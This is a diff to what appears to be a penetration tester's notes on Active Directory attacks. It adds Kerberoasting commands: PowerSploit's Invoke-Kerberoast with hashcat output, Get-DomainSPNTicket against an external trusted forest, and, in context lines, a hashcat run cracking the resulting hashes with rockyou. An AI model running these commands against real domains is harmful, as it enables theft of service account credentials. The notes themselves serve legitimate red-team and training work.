@@ -48,7 +48,7 @@ ___
 ```
 ___ 
 
-## [Dumping credentials](../../#dumping-credentials)
+## [Dumping credentials](./Post_Exploitation.html#dumping-credentials1)
 ___
 ## Bloodhound (Sharphound)[^2] 
 
@@ -111,6 +111,18 @@ ___
     ```
 
 1. From Windows
+    * [PowerSploit](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)
+        ```powershell
+        Invoke-Kerberoast -Domain domain.com -OutputFormat hashcat
+        ```
+        * Getting SPN ticekts of from an external external forest
+            * Works if there is trust towards the domain you are in
+            ```powershell
+            Get-DomainSPNTicket <SERVICE>/DC01.domain-external.com@domain-external.com
+            ```
+
+
+[Password Cracking](../../Password_Cracking/Hashcat_general_cheatsheet.html)
     * Refer to [m0chan's blog](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html)
     ```batch
     hashcat64.exe -a 3 -m 13100 SPN.hash /wordlists/rockyou.txt
